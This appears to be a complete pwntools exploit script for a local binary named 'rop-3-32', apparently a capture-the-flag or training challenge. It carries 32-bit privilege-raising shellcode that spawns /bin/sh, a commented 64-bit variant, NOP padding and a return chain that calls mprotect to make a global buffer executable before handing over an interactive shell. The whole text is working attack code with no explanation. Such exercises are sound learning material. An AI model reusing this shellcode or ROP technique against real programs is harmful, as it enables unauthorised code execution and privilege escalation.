#!/usr/bin/env python

from pwn import *
import os

p = process('./rop-3-32')

shellcode = 'j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xdb1\xc91\xd2j\x0bXShn/shh//bi\x89\xe3\xcd\x80'
#64 bit:'jlX\x0f\x05H\x89\xc6H\x89\xc7jrX\x0f\x05H1\xf6H1\xd2j;XH\xbb//bin/shVSH\x89\xe7\x0f\x05'

while (len(shellcode)) < 0x9c:
        shellcode += "\x90"

buf = shellcode

"""
0x08048360  mprotect@plt
"""

mprotect = p32(0x08048360)


g_buf_addr = p32(0x804a060)
g_buf_aligned = p32(0x804a000)

buf += mprotect
buf += g_buf_addr
buf += g_buf_aligned
buf += p32(0x1000)
buf += p32(0x7)

with open("e.txt", "w") as f:
    f.write(buf)
    f.close

p.sendline(buf)
p.interactive()
